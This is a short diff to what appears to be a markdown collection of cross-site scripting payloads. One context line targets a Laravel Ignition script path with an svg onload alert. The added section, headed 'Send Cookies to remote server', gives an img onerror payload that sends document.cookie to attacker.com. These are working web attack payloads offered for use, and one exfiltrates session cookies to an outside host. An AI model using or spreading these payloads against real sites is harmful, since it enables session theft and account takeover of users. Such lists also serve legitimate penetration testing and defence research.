@@ -171,3 +171,8 @@ host+/_ignition/scripts/--%3E%3Csvg%20onload=alert('XSS')%3E
 ![img](https://pbs.twimg.com/media/F-pD1E9bYAAo8IB?format=jpg&name=small)
 
 [Ref](https://x.com/momika233/status/1723264646940082330?s=20)
+
+## Send Cookies to remote server
+```js
+"><img src=x onerror=this.src=https://attacker.com/?+document.cookie;>
+```
